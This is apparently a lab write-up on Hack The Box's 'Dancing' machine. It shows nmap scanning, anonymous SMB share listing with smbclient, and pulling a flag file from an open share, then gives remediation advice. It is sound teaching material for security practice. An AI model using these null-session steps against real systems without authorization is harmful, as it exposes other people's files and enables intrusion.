---
layout: post
title: "HTB Starting Point — Dancing: SMB Null Session"
date: 2026-06-23 14:00:00 -0700
categories: [htb, starting-point]
tags: [smb, null-session, enumeration, windows, misconfiguration]
---

Third and final Tier 0 box of the Hack The Box **Starting Point** track — and the one
that completes a clear trilogy with
[Meow]({% post_url 2026-06-09-htb-starting-point-meow %}) (Telnet) and
[Fawn]({% post_url 2026-06-16-htb-starting-point-fawn %}) (FTP). Dancing is a **Windows**
box, but the takeaway is identical: a service exposed **without proper authentication**
hands over its data.

> **Difficulty:** Very Easy · **OS:** Windows · **Key idea:** anonymous SMB access
> (null session) to a misconfigured share.

## 1. Recon

```bash
nmap -sC -sV -T4 -oN nmap_initial.txt 10.129.x.x
```

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0    # WinRM
Service Info: OS: Windows
```

The interesting port is **445 (SMB)** — Windows file sharing. (Port 5985 is WinRM/remote
management — good to note, but not needed here.)

## 2. Enumerate the shares

**SMB** (Server Message Block) is the Windows protocol for sharing files, printers, and
IPC over a network. First question: can we list the shares **without credentials** (a
"null session")?

```bash
smbclient -L //10.129.x.x/ -N        # -N = no password
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
WorkShares      Disk
```

`ADMIN$`, `C$`, and `IPC$` are **default administrative shares**. **`WorkShares`** is
custom — and the fact a null session can even see it is the tell. Let's connect:

```bash
smbclient //10.129.x.x/WorkShares -N -c 'recurse ON; ls'
```

```
\Amy.J
  worknotes.txt
\James.P
  flag.txt
```

Anonymous access is allowed, and it exposes two user folders.

## 3. Loot

```bash
smbclient //10.129.x.x/WorkShares -N -c 'cd James.P; get flag.txt'
cat flag.txt   # -> [REDACTED — 32-char hash]
```

Flag pulled straight off the share. Machine owned. ✅

## 4. Why it worked & how to fix it

| Root cause | Remediation |
|---|---|
| Null/anonymous SMB session allowed | Disable anonymous access; require authentication for share listing |
| Sensitive files on an open share | Apply least-privilege share/NTFS permissions; don't store secrets on shares |
| Guest access to `WorkShares` | Restrict shares to specific authenticated users/groups |

## Tier 0, in one sentence

Three boxes, three protocols — **Telnet, FTP, SMB** — one root cause every time:
**a networked service reachable without authentication.** The methodology never changed:
`nmap` to find the service, enumerate it, then take what a missing auth check left open.
Enumeration first, always.

*Performed in a legal, authorized environment (HTB Starting Point).*
